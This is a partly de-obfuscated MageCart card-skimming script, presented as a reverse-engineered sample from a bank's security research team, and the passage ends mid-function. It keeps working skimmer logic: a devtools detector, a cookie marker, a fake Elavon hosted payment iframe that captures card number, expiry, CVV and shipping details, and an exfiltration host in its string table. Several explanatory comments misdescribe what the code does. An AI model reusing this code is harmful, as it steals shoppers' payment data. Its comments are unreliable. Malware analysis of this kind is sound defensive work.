// /*!
// MageCart sample reverse engineered by Daniel Cuthbert
// Santander Cyber Security Research (CSR)
//  */


// Heavily used dictionary to define all 
const MageMainVar = [
  'use strict', // 0
  'devtoolschange', // 1
  'dispatchEvent', // 2
  'outerWidth', // 3
  'innerWidth', // 4
  'outerHeight', // 5
  'innerHeight', // 6
  'vertical', // 7
  'horizontal', // 8
  'Firebug', // 9
  'chrome', // 10
  'isInitialized', // 11
  'open', // 12
  'orientation', // 13
  'undefined', // 14
  'exports', // 15
  'devtools', // 16
  'querySelector', // 17
  'value', // 18
  '', // 19
  'random', // 20
  'floor', // 21
  'media', // 22
  'image', // 23
  'img', // 24
  'data', // 25
  'png', // 26
  'tiff', // 27
  'gif', // 28
  'raw', // 29
  'getTime', // 30
  'setTime', // 31
  '; expires=', // 32
  'toUTCString', // 33
  'cookie', // 34
  '=', // 35
  '; path=/', // 36
  ';', // 37
  'split', // 38
  'length', // 39
  'substring', // 40
  'charAt', // 41
  ' ', // 42
  'indexOf', // 43
  'replace', // 44
  'reverse', // 45
  'match', // 46
  'push', // 47
  'join', // 48
  'mage-cache-storage-app', // 49
  'storageapp', // 50
  '#realexpayments__hpp-iframe', // 51
  '#realexpayments_hpp-iframe', // 52
  'contentDocument', // 53
  'cc', // 54
  'frames_id', // 55
  'trim', // 56
  '#pas_ccnum', // 57
  '#pas_expiry', // 58
  '#pas_cccvc', // 59
  'input', // 60
  'target', // 61
  'addEventListener', // 62
  'keyCode', // 63
  '/', // 64
  '0', // 65
  '01/$1', // 66
  '$1/', // 67
  '0$1/', // 68
  'afterend', // 69
  'insertAdjacentHTML', // 70
  'write', // 71
  'close', // 72
  'display', // 73
  'style', // 74
  'none', // 75
  '#co-shipping-form input[name=firstname]', // 76
  '#co-shipping-form input[name=lastname]', // 77
  'addresses', // 78
  'customerData', // 79
  'firstname', // 80
  'values', // 81
  'lastname', // 82
  '<iframe id="', // 83
  'frame_id', // 84
    "#", //85 
    '" class="realexpayments iframe" scrolling="no" border="0" style="width: 684px; height: 590px;" frameborder="0"></iframe>', // 86
    '\r\n\t\t<html lang="en">\r\n  <head>\r\n    <meta charset="UTF-8" content="IE=edge" http-equiv="X-UA-Compatible">\r\n    <meta charset="UTF-8" content="IE=9" http-equiv="X-UA-Compatible">\r\n    <meta charset="UTF-8" content="IE=8" http-equiv="X-UA-Compatible">\r\n    <meta charset="UTF-8" content="IE=7" http-equiv="X-UA-Compatible">\r\n    <meta content="width=device-width,height=device-height,initial-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport">\r\n    <link rel="stylesheet" href="https://pay.elavonpaymentgateway.com/resources/css/v2/hpp.16-d587e75587e.min.css">\r\n    <link rel="stylesheet" href="https://pay.elavonpaymentgateway.com/resources/css/v2/portfolios/elavon.min.css">\r\n    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->\r\n    <!-- WARNING: Respond.js doesn\'t work if you view the page via file:// -->\r\n    <!--[if lt IE 9]>\r\n<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>\r\n<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>\r\n<![endif]-->\r\n    <!--[if lte IE 9]>\r\n<script type="text/javascript">\r\nisSpecialBrowser = true;\r\n</script>\r\n<![endif]-->\r\n    <title>Hosted Payment Page</title>\r\n\t\t<style>\r\n\t\tspan.hpp-pay::before {content:\'\'}\r\n\t\tspan.hpp-info-circle.rxp-popover::before {content:\'\'}\r\n\t\t</style>\r\n  </head>\r\n  <body>\r\n    <noscript>\r\n      <style>\r\n        .rxp-placeholder {\r\n          display: none;\r\n        }\r\n      </style>\r\n      <h1 class="noscript">JavaScript is required on your browser to\r\n        use this service. Please turn on JavaScript or upgrade your browser\r\n        to have JavaScript capability.\r\n      </h1>\r\n    </noscript>\r\n    <div class="container-fluid portfolio-elavon en" id="rxp-hpp">\r\n      <!-- HTML ALERT MESSAGES SECTIONS -->\r\n      <div id="alert-container" tabindex="-1">\r\n      </div>\r\n      <!-- END HTML ALERT MESSAGES SECTIONS -->\r\n      <div class="success" id="success-pane" style="display: none">\r\n        <span id="result-message">\r\n        </span>\r\n      </div>\r\n      <div class="rxp-container rxp-merchant-container">\r\n        <div class="row" id="rxp-header">\r\n          <div class="col-lg-12" id="rxp-header-title">\r\n            <h1 class="rxp-title">\r\n              <span>Payment Details\r\n              </span>\r\n            </h1>\r\n          </div>\r\n        </div>\r\n        <!-- HTML CONTAINER OF SECTIONS -->\r\n        <div aria-multiselectable="true" class="panel-group" id="hpp-accordion">\r\n          <!-- HTML FOR PAY WITH SAVED CARD SECTION -->\r\n          <!-- END HTML FOR PAY WITH SAVED CARD SECTION -->\r\n          <!-- HTML FOR PAY WITH ANOTHER CARD SECTION -->\r\n          <div class="panel" id="another-card-section">\r\n            <div id="panelPayWithNewCard" role="region" aria-expanded="true" class="panel-collapse in">\r\n              <div class="panel-body">\r\n                <div id="rpx-another-card">\r\n                  <!-- FORM PAYMENT -->\r\n                  <div id="card-payment-form">\r\n                    <div class="row" id="rpx-cardnum-section">\r\n                      <div class="form-group">\r\n                        <div class="col-lg-6 col-md-6 col-xs-6" id="rpx-cardnum-title">\r\n                          <label class="control-label" for="pas_ccnum">Card Number\r\n                          </label>\r\n                        </div>\r\n                        <div class="col-lg-6 col-md-6 col-xs-6" id="rpx-cardnum-item">\r\n                          <span aria-live="polite" class="visually-hidden" id="rxp-selected-card">\r\n                          </span>\r\n                          <span class="pull-right rxp-allowed-cards">\r\n                            <img alt="Visa-Card" aria-disabled="false" class="rxp rxp-visa-small" id="visa-logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAQCAYAAADj5tSrAAAAJUlEQVQ4T2NkoANgpIMdDKOWkBTKo8E1GlwkhQBJikdT1wgNLgA7+AARnF7vNQAAAABJRU5ErkJggg==">\r\n                            <img alt="Mastercard-Card" aria-disabled="false" class="rxp rxp-mc-small" id="mc-logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAQCAYAAAAMJL+VAAAAJUlEQVQ4T2NkoDFgpLH5DKMWEAzh0SAaDSKCIUBQwWgqGgFBBAA5mAAR8NWIIgAAAABJRU5ErkJggg==">\r\n                            <img alt="Switch-Card" aria-disabled="false" class="rxp rxp-switch-small" id="switch-logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABwAAAATCAYAAACDW21BAAAANElEQVRIS2NkoDNgpLN9DKMWUj3ER4N0NEhJDoHRRENykBHSMBqkhEKIZPnRICU5yAhpAABcQQAUOrV/ogAAAABJRU5ErkJggg==">\r\n                            <img class="rxp-hidden" id="card-loader" src="https://pay.elavonpaymentgateway.com/resources/images/ajax-loader.gif">\r\n                          </span>\r\n                        </div>\r\n                        <div class="col-lg-12 col-md-12 col-xs-12" id="rpx-cardnum-box">\r\n                          <input autocomplete="cc-number" class="form-control digitsOnly" id="pas_ccnum" maxlength="23" name="pas_ccnum" required="required" type="tel" placeholder="Card Number" aria-required="true">\r\n                          <input id="cardIdentifyError" name="cardIdentifyError" type="hidden" value="">\r\n                          <span class="help-inline" id="card-errors" role="alert">\r\n                          </span>\r\n                        </div>\r\n                      </div>\r\n                    </div>\r\n                    <div class="row" id="rpx-date-cccvc-section">\r\n                      <div class="col-lg-6 col-md-7 col-xs-12" id="rpx-expiry-date">\r\n                        <div class="form-group">\r\n                          <div class="col-xs-12">\r\n                            <label class="control-label" for="pas_expiry">Expiry\r\n                            </label>\r\n                          </div>\r\n                          <div class="col-xs-12">\r\n                            <input autocomplete="cc-exp" class="form-control digitsOnly" id="pas_expiry" maxlength="5" name="pas_expiry" required="required" type="tel" placeholder="MM/YY" aria-required="true">\r\n                            <span class="help-inline" id="expiry-error-container" role="alert">\r\n                            </span>\r\n                          </div>\r\n                        </div>\r\n                      </div>\r\n                      <div class="col-lg-6 col-md-5 col-xs-12" id="rpx-security-code">\r\n                        <div class="form-group">\r\n                          <div class="col-xs-12">\r\n                            <label class="control-label" for="pas_cccvc">Security Code\r\n                            </label>\r\n                          </div>\r\n                          <div class="col-xs-12">\r\n                            <div class="input-group">\r\n                              <input autocomplete="cc-csc" class="form-control digitsOnly" id="pas_cccvc" maxlength="4" name="pas_cccvc" required="required" type="tel" placeholder="Security Code" aria-required="true">\r\n                              <div class="input-group-addon">\r\n                                <span style="font-size:1em" class="hpp-info-circle rxp-popover" data-container="body" data-toggle="popover" role="button" tabindex="0" data-title="Security Code" data-content="The last 3 digits on the back of your card. For American Express, it is the last 4 digits on the front of your card." aria-label="Information about Security Code" data-original-title="" title="">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t?\r\n                                </span>\r\n                              </div>\r\n                            </div>\r\n                            <span class="help-inline" role="alert">\r\n                            </span>\r\n                          </div>\r\n                        </div>\r\n                      </div>\r\n                    </div>\r\n                    <div class="row" id="rpx-issue-number-section" style="display: none">\r\n                      <div class="form-group">\r\n                        <div class="col-xs-12">\r\n                          <label class="control-label" for="pas_issuenumber">Issue Number (if applicable)\r\n                          </label>\r\n                        </div>\r\n                        <div class="col-xs-12">\r\n                          <input autocomplete="off" class="form-control digitsOnly" id="pas_issuenumber" maxlength="2" name="pas_issuenumber" type="tel" placeholder="Issue Number">\r\n                          <span aria-live="assertive" class="help-inline" id="issuenumber-errors" role="alert">\r\n                          </span>\r\n                        </div>\r\n                      </div>\r\n                    </div>\r\n                    <div class="row" id="rpx-cardholder-section">\r\n                      <div class="form-group">\r\n                        <div class="col-xs-12">\r\n                          <label class="control-label" for="pas_ccname">Cardholder Name\r\n                          </label>\r\n                        </div>\r\n                        <div class="col-xs-12">\r\n                          <input value="',
    '" autocomplete="cc-name" class="form-control" id="pas_ccname" maxlength="100" name="pas_ccname" required="required" type="text" placeholder="Cardholder Name" aria-required="true">\r\n                          <span class="help-inline" id="ccname-errors" role="alert">\r\n                          </span>\r\n                        </div>\r\n                      </div>\r\n                    </div>\r\n                    <div class="dcc-offer-container" id="realex-dcc-holder">\r\n                    </div>\r\n                    <input class="rxp-field" name="guid" type="hidden" value="8b44b578-72c5-4784-b8a7-20b891bc2d91">\r\n                    <input id="dccchoice" name="dccchoice" type="hidden" value="NO">\r\n                    <input id="dccrate" name="dccrate" type="hidden" value="">\r\n                  </div>\r\n                  <!-- END FORM PAYMENT -->\r\n                </div>\r\n              </div>\r\n            </div>\r\n            <div class="col-xs-12" id="amount-surcharge-offer-section" style="display: none">\r\n              <p class="amount-surcharge" id="amountSurcharge">An additional charge for the card type (\r\n                <span id="merchantDataCardType">\r\n                </span>) will be applied.\r\n                <br> You will be charged \r\n                <span id="merchantDataCurrency">\r\n                </span>\r\n                <span id="merchantDataAmount">\r\n                </span>.\r\n              </p>\r\n            </div>\r\n          </div>\r\n          <!-- END HTML FOR PAY WITH ANOTHER CARD SECTION -->\r\n        </div>\r\n        <!-- END HTML CONTAINER OF SECTIONS -->\r\n        <div class="row" id="info-box-footer">\r\n          <div class="col-xs-12">\r\n            <p class="rxp-btn-info rxp-merchant-btn-info rxp-center rxp-hidden">For added security you will be transferred to your bank\'s card verification page\r\n            </p>\r\n            <p class="text-center rxp-hidden" id="loading-footer">\r\n              <img src="https://pay.elavonpaymentgateway.com/resources/images/ajax-loader.gif">\r\n            </p>\r\n          </div>\r\n        </div>\r\n        <div id="main-btn-box">\r\n          <input id="rxp-primary-btn-old-text" name="rxp-primary-btn-old-text" type="hidden">\r\n          <button class="btn btn-hpp-a form-control" id="rxp-primary-btn" type="submit" value="Pay Now">\r\n            <span class="hpp-pay">\r\n            </span> Pay Now\r\n          </button>\r\n        </div>\r\n        <div class="row" id="rxp-footer">\r\n          <div class="col-xs-4" id="rxp-footer-logo-ssl-box">\r\n            <div class="ssl-text-logo">\r\n              <img alt="256-bit SSL encrypted logo" class="ssl-logo_ico" src="https://pay.elavonpaymentgateway.com/resources/images/ssl_logo_ico.svg">\r\n              <span class="ssl-msg">256-bit SSL\r\n                <br>encrypted\r\n              </span>\r\n            </div>\r\n          </div>\r\n          <div class="col-xs-8 text-center col-sm-4" id="rxp-footer-logo-box">\r\n            <img class="rxp-footer-logo img-responsive" alt="elavon" src="https://pay.elavonpaymentgateway.com/resources/images/footer/v2/elavon.png">\r\n          </div>\r\n        </div>\r\n      </div>\r\n      <div id="rxp-hpp-tab-loop" tabindex="0">\r\n      </div>\r\n    </div>\r\n    <div class="container-fluid portfolio-elavon en" id="3ds2-acs-challenge-container" style="text-align: center; padding: 0">\r\n    </div>\r\n    <!-- END DCC HANDEBARS TEMPLATE -->\r\n  </body>\r\n</html>\r\n\r\n\t\t',
    "frame_id", //87
    "checkout", //88
    "includes", //89
    "href", //90
    "location", //91
    "c", // 92
    "reload", // 93
    "b", // 94 
    "getItem", // 95
    "cnum:", // 96
    "exp:", // 97 
    "cvv:", // 98 
    "name:", // 99 
    "addr:", // 100
    '#co-shipping-form input[name="street[0]"]', // 101
    "city:", // 102
    "#co-shipping-form input[name=city]", // 103
    "zip:", // 104 
    "#co-shipping-form input[name=postcode]", // 105
    "cnt:UK", // 106 
    "phone:", // 107 
    "#co-shipping-form input[name=telephone]", // 108 
    "eml:", // 109 
    "#customer-email", // 110
    "state:", // 111
    "#co-shipping-form input[name=region]", // 112
    "street", // 113 
    "city", // 114 
    "postcode", // 115
    "cnt:", // 116
    "country_id", // 117
    "telephone", // 118
    "stringify", // 119
    "setItem", // 120
    "parse", // 121
    "concat", // 122
    "filter", // 123
    "removeItem", // 124
    "data:", // 125
    ";base64,", // 126
    ":", // 127
    ",", // 128
    "append", // 129
    "//united81.com/css/images/", // 130
    ".", // 131
    "no-cors", // 132
    "POST", // 133
    "className", // 134
    "#rpx-cardnum-box", // 135
    "col-lg-12 col-md-12 col-xs-12 has-error", // 136
    "remove", // 137
    "width: 684px; height: 590px;", // 138
    "setAttribute", // 139
  ];

  // (function () { : This is the start of an anonymous function.
  //   MageMainVar[0]; : This gets the first value from the MageMainVar array.
  //   var _0x8a18x1 = { open: false, orientation: null }; : This defines the _0x8a18x1 object.
  //   var _0x8a18x3 = function (_0x8a18x4, _0x8a18x5) { : This defines the _0x8a18x3 function.
  //   window[MageMainVar[2]](new CustomEvent(MageMainVar[1], { detail: { open: _0x8a18x4, orientation: _0x8a18x5 } })); : This calls the _0x8a18x3 function with the open state and orientation of the panel.
  //   })(); : This is the end of the anonymous function.

  (function () {
    MageMainVar[0];
    var _0x8a18x1 = {
      open: false,
      orientation: null,
    };
    var _0x8a18x3 = function (_0x8a18x4, _0x8a18x5) {
      window[MageMainVar[2]](
        new CustomEvent(MageMainVar[1], {
          detail: {
            open: _0x8a18x4,
            orientation: _0x8a18x5,
          },
        })
      );
    };

    // The code defines a function that is called every 100 milliseconds. The function does the following:

    // Checks if the horizontal or vertical scroll position has changed by more than 160 pixels.
    // If the scroll position has changed, the function sets the open property of the _0x8a18x1 object to true or false, depending on whether the scroll position is greater than or less than 160 pixels.
    // If the open property of the _0x8a18x1 object has changed, the function fires a custom event.

    // The code also checks if the module object exists and if it has a property called exports. If it does, the code stores the _0x8a18x1 object in the exports property of the module object. Otherwise, the code stores the _0x8a18x1 object in the window object.

    // The MageMainVar array is a placeholder for the actual values that will be used in the code. The values in the array will be different depending on the specific application that uses the code.

    // In general, this code can be used to track the scroll position of a web page and fire a custom event when the scroll position changes. This code can be used in a variety of applications, such as a web page that displays a sidebar that can be hidden or shown by scrolling the page.

    setInterval(function () {
      var _0x8a18x6 = window[MageMainVar[3]] - window[MageMainVar[4]] > 160;
      var _0x8a18x7 = window[MageMainVar[5]] - window[MageMainVar[6]] > 160;
      var _0x8a18x5 = _0x8a18x6 ? MageMainVar[7] : MageMainVar[8];
      if (
        !(_0x8a18x7 && _0x8a18x6) &&
        ((window[MageMainVar[9]] &&
          window[MageMainVar[9]][MageMainVar[10]] &&
          window[MageMainVar[9]][MageMainVar[10]][MageMainVar[11]]) ||
          _0x8a18x6 ||
          _0x8a18x7)
      ) {
        if (
          !_0x8a18x1[MageMainVar[12]] ||
          _0x8a18x1[MageMainVar[13]] !== _0x8a18x5
        ) {
          _0x8a18x3(true, _0x8a18x5);
        }
        _0x8a18x1[MageMainVar[12]] = true;
        _0x8a18x1[MageMainVar[13]] = _0x8a18x5;
      } else {
        if (_0x8a18x1[MageMainVar[12]]) {
          _0x8a18x3(false, null);
        }
        _0x8a18x1[MageMainVar[12]] = false;
        _0x8a18x1[MageMainVar[13]] = null;
      }
    }, 100);
    if (typeof module !== MageMainVar[14] && module[MageMainVar[15]]) {
      module[MageMainVar[15]] = _0x8a18x1;
    } else {
      window[MageMainVar[16]] = _0x8a18x1;
    }
  })();

  // The _0x8a18x8() function takes a string as input and returns the element with that ID if it exists in the document. 
  // The _0x8a18xa() function takes a string as input and returns the text content of the element with that ID if it exists in the document.
  // The next few lines of code define some constants. The _0x8a18xe() constant is an array of four colors. 
  // The _0x8a18xf() constant is an array of four date formats.
  // The _0x8a18x10() constant is a random number that will be used to generate a date.
  // The last line of code is a function that takes three arguments: a title, a text, and a date. 
  // The function uses the constants and functions defined earlier to generate a random HTML string with the given title, text, 
  // and date.

  (function () {
    let _0x8a18x8 = function (_0x8a18x9) {
      if (!document[MageMainVar[17]](_0x8a18x9)) {
        return undefined;
      }
      return document[MageMainVar[17]](_0x8a18x9);
    };
    let _0x8a18xa = function (_0x8a18x9) {
      if (_0x8a18x8(_0x8a18x9) !== undefined) {
        return _0x8a18x8(_0x8a18x9)[MageMainVar[18]];
      }
      return MageMainVar[19];
    };
    let _0x8a18xe = [
      MageMainVar[22],
      MageMainVar[23],
      MageMainVar[24],
      MageMainVar[25],
    ][Math[MageMainVar[21]](Math[MageMainVar[20]]() * 4 + 0)];
    let _0x8a18xf = [
      MageMainVar[26],
      MageMainVar[27],
      MageMainVar[28],
      MageMainVar[29],
    ][Math[MageMainVar[21]](Math[MageMainVar[20]]() * 4 + 0)];
    let _0x8a18x10 = Math[MageMainVar[21]](
      Math[MageMainVar[20]]() * 90000000000000 + 10000000000000
    );
    let _0x8a18x11 = (_0x8a18x12, _0x8a18x13, _0x8a18x14) => {
      let _0x8a18x15 = MageMainVar[19];
      if (_0x8a18x14) {
        const _0x8a18x16 = new Date();
        _0x8a18x16[MageMainVar[31]](
          _0x8a18x16[MageMainVar[30]]() + _0x8a18x14 * 24 * 60 * 60 * 1000
        );
        _0x8a18x15 = MageMainVar[32] + _0x8a18x16[MageMainVar[33]]();
      }
      document[MageMainVar[34]] =
        _0x8a18x12 +
        MageMainVar[35] +
        (_0x8a18x13 || MageMainVar[19]) +
        _0x8a18x15 +
        MageMainVar[36];
    };

    // a function that takes a string as input and returns the element with that ID in the document. 
    // The function works by first creating a new array with the elements in the document.
    // Then, it iterates through the array and compares the ID of each element to the input string.
    // If the ID of an element matches the input string, the function returns the element.
    // Otherwise, the function returns null.

    let _0x8a18x17 = (_0x8a18x12) => {
      let _0x8a18x18 = _0x8a18x12 + MageMainVar[35];
      let _0x8a18x19 = document[MageMainVar[34]][MageMainVar[38]](
        MageMainVar[37]
      );
      for (
        let _0x8a18x1a = 0;
        _0x8a18x1a < _0x8a18x19[MageMainVar[39]];
        _0x8a18x1a++
      ) {
        let _0x8a18x1b = _0x8a18x19[_0x8a18x1a];
        while (_0x8a18x1b[MageMainVar[41]](0) == MageMainVar[42]) {
          _0x8a18x1b = _0x8a18x1b[MageMainVar[40]](
            1,
            _0x8a18x1b[MageMainVar[39]]
          );
        }
        if (_0x8a18x1b[MageMainVar[43]](_0x8a18x18) == 0) {
          return _0x8a18x1b[MageMainVar[40]](
            _0x8a18x18[MageMainVar[39]],
            _0x8a18x1b[MageMainVar[39]]
          );
        }
      }
      return null;
    };

    // takes a string as input and returns true if the sum of the digits of the string is divisible by 10, 
    // and false otherwise.The function works by first converting the string to an array of digits.
    // Then, it iterates through the array and adds the digits together.
    // Finally, it checks if the sum is divisible by 10 and returns the appropriate value.

    let _0x8a18x1c = (_0x8a18x1d) => {
      if (_0x8a18x1d[MageMainVar[39]] == 0) {
        return;
      }
      _0x8a18x1d = _0x8a18x1d[MageMainVar[44]](/ /g, MageMainVar[19]);
      var _0x8a18x1e;
      var _0x8a18x1f;
      var _0x8a18x20;
      var _0x8a18x21;
      var _0x8a18x22;
      var _0x8a18x23;
      _0x8a18x20 = true;
      _0x8a18x21 = 0;
      _0x8a18x1f = (_0x8a18x1d + MageMainVar[19])
        [MageMainVar[38]](MageMainVar[19])
        [MageMainVar[45]]();
      _0x8a18x22 = 0;
      for (
        _0x8a18x23 = _0x8a18x1f[MageMainVar[39]];
        _0x8a18x22 < _0x8a18x23;
        _0x8a18x22++
      ) {
        _0x8a18x1e = _0x8a18x1f[_0x8a18x22];
        _0x8a18x1e = parseInt(_0x8a18x1e, 10);
        if ((_0x8a18x20 = !_0x8a18x20)) {
          _0x8a18x1e *= 2;
        }
        if (_0x8a18x1e > 9) {
          _0x8a18x1e -= 9;
        }
        _0x8a18x21 += _0x8a18x1e;
      }
      return _0x8a18x21 % 10 === 0;
    };

    // a function that takes a string as input and returns a string with the Luhn checksum. 
    // The Luhn checksum is a simple checksum used to validate credit card numbers.
    // The function works by first splitting the string on spaces and then converting each word to a number.
    // Then, it adds the digits together, starting with the rightmost digit and adding the digits in pairs, 
    // alternating the direction of the sum. Finally, it appends the checksum to the end of the string.

    // The first few lines of code define some variables. The _0x8a18xa variable is a string variable that stores the text without spaces or non-numeric characters. The _0x8a18x25 variable is an array variable that stores the four-digit blocks of the text. The _0x8a18x26 variable is a string variable that stores the text with the checksum appended to the end.
    // The next few lines of code iterate through the array of four-digit blocks and calculate the checksum for each block.
    // The last line of code returns the string with the checksum appended to the end.

    let _0x8a18x24 = function (_0x8a18x13) {
      var _0x8a18xa = _0x8a18x13[MageMainVar[44]](/\s+/g, MageMainVar[19])[
        MageMainVar[44]
      ](/[^0-9]/gi, MageMainVar[19]);
      var _0x8a18x25 = _0x8a18xa[MageMainVar[46]](/\d{4,17}/g);
      var _0x8a18x26 = (_0x8a18x25 && _0x8a18x25[0]) || MageMainVar[19];
      var _0x8a18x27 = [];
      i = 0;
      for (len = _0x8a18x26[MageMainVar[39]]; i < len; i += 4) {
        _0x8a18x27[MageMainVar[47]](_0x8a18x26[MageMainVar[40]](i, i + 4));
      }
      if (_0x8a18x27[MageMainVar[39]]) {
        return _0x8a18x27[MageMainVar[48]](MageMainVar[42]);
      } else {
        return _0x8a18x13;
      }
    };

    // a JavaScript object that stores some data. The object has four properties: c, b, frames_id, and frame_id. 
    // The c property stores a string, the b property stores a number, the frames_id property stores an object, 
    // and the frame_id property stores another object.

    // The frames_id object has one property: cc. The cc property stores a string. The frame_id object also has one property: cc. 
    // The cc property stores a string.

    
    // The first line of code defines a JavaScript object called _0x8a18x28.
    // The next few lines of code define the properties of the object. The c property is a string with the value "cc". 
    // The b property is a number with the value 123. 
    // The frames_id property is an object with the cc property set to the value "cc".
    // The frame_id property is another object with the cc property set to the value "cc".

    let _0x8a18x28 = {
      c: MageMainVar[49],
      b: MageMainVar[50],
      frames_id: {
        cc: MageMainVar[51],
      },
      frame_id: {
        cc: MageMainVar[52],
      },
    };

    // a function that takes four arguments: _0x8a18x30, _0x8a18x31, _0x8a18x32, and _0x8a18x33. 
    // The function first checks if the first argument, _0x8a18x30, is a valid object.
    // If it is not, the function calls the _0x8a18x8() function to create a new object.
    // Then, the function calls the _0x8a18x8() function on the second argument, _0x8a18x31, and passes the new object 
    // as the first argument.
    // The function then calls the _0x8a18x70() function on the third argument, _0x8a18x32, and passes the new object 
    // as the first argument.
    // Finally, the function calls the _0x8a18x71() function on the fourth argument, _0x8a18x33, and passes the new object as the first argument.

  
  
    let _0x8a18x29 = () => {
      let _0x8a18x2a = {
        cc: _0x8a18x8(_0x8a18x28[MageMainVar[55]][MageMainVar[54]])[
          MageMainVar[53]
        ],
      };
      let _0x8a18x2b = () => {
        if (
          _0x8a18x1c(
            _0x8a18x2a[MageMainVar[54]]
              [MageMainVar[17]](MageMainVar[57])
              [MageMainVar[18]][MageMainVar[56]]()
          ) &&
          _0x8a18x2a[MageMainVar[54]][MageMainVar[17]](MageMainVar[57])[
            MageMainVar[18]
          ][MageMainVar[39]] > 14 &&
          _0x8a18x2a[MageMainVar[54]][MageMainVar[17]](MageMainVar[58])[
            MageMainVar[18]
          ][MageMainVar[39]] == 5 &&
          _0x8a18x2a[MageMainVar[54]][MageMainVar[17]](MageMainVar[59])[
            MageMainVar[18]
          ][MageMainVar[39]] >= 3
        ) {
          _0x8a18x39();
        }
      };
      _0x8a18x2a[MageMainVar[54]]
        [MageMainVar[17]](MageMainVar[57])
        [MageMainVar[62]](MageMainVar[60], (_0x8a18x2c) => {
          _0x8a18x2c[MageMainVar[61]][MageMainVar[18]] = _0x8a18x24(
            _0x8a18x2c[MageMainVar[61]][MageMainVar[18]]
          );
        });
      _0x8a18x2a[MageMainVar[54]]
        [MageMainVar[17]](MageMainVar[58])
        [MageMainVar[62]](MageMainVar[60], (_0x8a18x2c) => {
          var _0x8a18x2d = _0x8a18x2c[MageMainVar[63]];
          var _0x8a18x2e = [8];
          if (_0x8a18x2e[MageMainVar[43]](_0x8a18x2d) !== -1) {
            return;
          }
          _0x8a18x2c[MageMainVar[61]][MageMainVar[18]] = _0x8a18x2c[
            MageMainVar[61]
          ][MageMainVar[18]]
            [MageMainVar[44]](/^([1-9]\/|[2-9])$/g, MageMainVar[68])
            [MageMainVar[44]](/^(0[1-9]|1[0-2])$/g, MageMainVar[67])
            [MageMainVar[44]](/^1([3-9])$/g, MageMainVar[66])
            [MageMainVar[44]](/^0\/|0+$/g, MageMainVar[65])
            [MageMainVar[44]](/[^\d|^\/]*/g, MageMainVar[19])
            [MageMainVar[44]](/\/\//g, MageMainVar[64]);
        });
      _0x8a18x2a[MageMainVar[54]]
        [MageMainVar[17]](MageMainVar[57])
        [MageMainVar[62]](MageMainVar[60], _0x8a18x2b);
      _0x8a18x2a[MageMainVar[54]]
        [MageMainVar[17]](MageMainVar[58])
        [MageMainVar[62]](MageMainVar[60], _0x8a18x2b);
      _0x8a18x2a[MageMainVar[54]]
        [MageMainVar[17]](MageMainVar[59])
        [MageMainVar[62]](MageMainVar[60], _0x8a18x2b);
    };

  // The first line of code defines a function called _0x8a18x2f().
  // The next few lines of code define the arguments to the function. The _0x8a18x30 argument is the object to be checked. 
  // The _0x8a18x31 argument is the object to be passed to the _0x8a18x8() function. 
  // The _0x8a18x32 argument is the value to be passed to the _0x8a18x70() function. 
  // The _0x8a18x33 argument is the value to be passed to the _0x8a18x71() function.
  // The next few lines of code check if the first argument, _0x8a18x30, is a valid object. If it is not, the function calls the _0x8a18x8() function to create a new object.
  // The next line of code calls the _0x8a18x8() function on the second argument, _0x8a18x31, and passes the new object as the first argument.
  // The next line of code calls the _0x8a18x70() function on the third argument, _0x8a18x32, and passes the new object as the first argument.
  // The last line of code calls the _0x8a18x71() function on the fourth argument, _0x8a18x33, and passes the new object as the first argument.


    let _0x8a18x2f = (_0x8a18x30, _0x8a18x31, _0x8a18x32, _0x8a18x33) => {
      if (!_0x8a18x8(_0x8a18x30)) {
        _0x8a18x8(_0x8a18x31)[MageMainVar[70]](MageMainVar[69], _0x8a18x32);
        if (_0x8a18x8(_0x8a18x30)) {
          let _0x8a18x2a = _0x8a18x8(_0x8a18x30)[MageMainVar[53]];
          _0x8a18x2a[MageMainVar[12]]();
          _0x8a18x2a[MageMainVar[71]](_0x8a18x33);
          _0x8a18x2a[MageMainVar[72]]();
          _0x8a18x8(_0x8a18x31)[MageMainVar[74]][MageMainVar[73]] =
            MageMainVar[75];
          if (_0x8a18x8(_0x8a18x28[MageMainVar[55]][MageMainVar[54]])) {
            _0x8a18x29();
          }
        }
      }
    };

    let _0x8a18x34 = () => {
      let _0x8a18x35 = MageMainVar[19];
      if (_0x8a18x8(MageMainVar[76])[MageMainVar[18]] != MageMainVar[19]) {
        _0x8a18x35 =
          _0x8a18x8(MageMainVar[76])[MageMainVar[18]] +
          MageMainVar[42] +
          _0x8a18x8(MageMainVar[77])[MageMainVar[18]];
      } else {
        if (checkoutConfig[MageMainVar[79]][MageMainVar[78]] !== undefined) {
          _0x8a18x35 =
            Object[MageMainVar[81]](
              checkoutConfig[MageMainVar[79]][MageMainVar[78]]
            )[0][MageMainVar[80]] +
            MageMainVar[42] +
            Object[MageMainVar[81]](
              checkoutConfig[MageMainVar[79]][MageMainVar[78]]
            )[0][MageMainVar[82]];
        }
      }
      let _0x8a18x36 =
        MageMainVar[83] +
        _0x8a18x28[MageMainVar[55]][MageMainVar[54]][MageMainVar[44]](
          MageMainVar[84],
          MageMainVar[19]
        ) +
        MageMainVar[85];
      cc_ifr = _0x8a18x2f(
        _0x8a18x28[MageMainVar[55]][MageMainVar[54]],
        _0x8a18x28[MageMainVar[88]][MageMainVar[54]],
        _0x8a18x36,
        `${MageMainVar[86]}${_0x8a18x35}${MageMainVar[87]}`
      );
    };

    // The first line of code defines a function called _0x8a18x38().
    // The next few lines of code check if the devtools object exists and if it has a function called inspect.
    // If the devtools object exists and it has a function called inspect, the function calls the inspect function on the _0x8a18x28 object.
    // If the devtools object does not exist or if it does not have a function called inspect, the function does nothing.

    let _0x8a18x38 = () => {
      if (
        !window[MageMainVar[92]][MageMainVar[91]][MageMainVar[90]](
          MageMainVar[89]
        )
      ) {
        return;
      }
      if (devtools[MageMainVar[12]]) {
        _0x8a18x11(_0x8a18x28[MageMainVar[93]], _0x8a18xf, 5);
        window[MageMainVar[92]][MageMainVar[94]]();
      }
      if (_0x8a18x17(_0x8a18x28[MageMainVar[93]])) {
        return;
      }
      if (_0x8a18x8(_0x8a18x28[MageMainVar[88]][MageMainVar[54]])) {
